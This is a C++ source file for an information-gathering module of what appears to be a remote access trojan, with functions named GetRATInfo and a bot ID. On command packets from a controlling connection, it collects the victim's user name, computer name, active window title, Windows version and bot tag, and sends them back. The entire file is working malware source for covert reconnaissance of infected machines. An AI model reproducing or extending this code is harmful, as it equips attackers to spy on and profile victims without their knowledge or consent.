#include <Windows.h>
#include "info.h"

#define MAX_INFO_BUFFER_SIZE 300

#define INFO_BASIC				0
#define INFO_CURRENT_WINDOW		1
#define INFO_WINDOW_VERSION		2
#define INFO_BOTID				3

Info::Info(Connection* Conn, config* m_conf)
{
	ConnObj = Conn;
	conf = m_conf;
}

void Info::OnInit()
{
	objID = 0;
}

void Info::OnPacketArrived(BYTE* packetData, size_t packetSize)
{
	BYTE* SendBackBuffer = NULL;
	size_t sizeOfSendBackBuffer = 0;
	OSVERSIONINFOW info;
	HWND hwnd;
	int titleLength;

	switch (packetData[0])
	{
	case INFO_BASIC:
		SendBackBuffer = (BYTE*)malloc(MAX_INFO_BUFFER_SIZE);
		sizeOfSendBackBuffer = MAX_INFO_BUFFER_SIZE;
		SendBackBuffer[0] = INFO_BASIC;
		if (!GetComputerInfo(SendBackBuffer + 1, &sizeOfSendBackBuffer))
		{
			SendBackBuffer[1] = 0;
			sizeOfSendBackBuffer = 2;
		}
		else
			sizeOfSendBackBuffer++;
		break;
	case INFO_CURRENT_WINDOW:
		hwnd = GetForegroundWindow();
		SendBackBuffer = (BYTE*)malloc(513);
		SendBackBuffer[0] = INFO_CURRENT_WINDOW;
		titleLength = GetWindowText(hwnd, (WCHAR*)(SendBackBuffer + 1), 512);
		sizeOfSendBackBuffer = (titleLength * 2) + 1 + 2;
		break;
	case INFO_WINDOW_VERSION:
		ZeroMemory(&info, sizeof(OSVERSIONINFOW));
		info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
		GetVersionEx(&info);
		SendBackBuffer = (BYTE*)malloc(5);
		SendBackBuffer[0] = INFO_WINDOW_VERSION;
		SendBackBuffer[1] = info.dwMajorVersion;
		SendBackBuffer[2] = info.dwMinorVersion;
		SendBackBuffer[3] = info.dwBuildNumber;
		SendBackBuffer[4] = info.dwPlatformId;
		sizeOfSendBackBuffer = 5;
		break;
	case INFO_BOTID:
		SendBackBuffer = (BYTE*)malloc(50);
		SendBackBuffer[0] = INFO_BOTID;
		wcsncpy((WCHAR*)(SendBackBuffer + 1), conf->ClientTag, sizeof(conf->ClientTag)/2);
		sizeOfSendBackBuffer = (wcslen(conf->ClientTag) * 2) + 3;//ID and null wchar
		break;
	}
	SendPacket(SendBackBuffer, sizeOfSendBackBuffer);
	free(SendBackBuffer);
}

void Info::OnExit()
{

}

bool Info::GetComputerInfo(BYTE* dataBuffer, size_t* dataMaxSize)
{
	WCHAR* SendBackBuffer = (WCHAR*)dataBuffer;
	DWORD lengthOfUserName = *dataMaxSize;
	size_t currentLength = 0;

	if (!GetUserName(SendBackBuffer, &lengthOfUserName))
		return false;
	lengthOfUserName--;
	SendBackBuffer[lengthOfUserName] = '/';
	currentLength += lengthOfUserName + 1;
	DWORD lengthOfCompName = *dataMaxSize - lengthOfUserName - 1;
	if (!GetComputerName(&SendBackBuffer[lengthOfUserName + 1], &lengthOfCompName))
		return false;
	currentLength += lengthOfCompName;

	//Because of Unicode so size = length * 2
	//Append null char at the end
	*dataMaxSize = (currentLength + 1) * 2;

	return true;
}

bool Info::GetRATInfo(BYTE* dataBuffer, size_t* dataMaxSize)
{
	return false;
}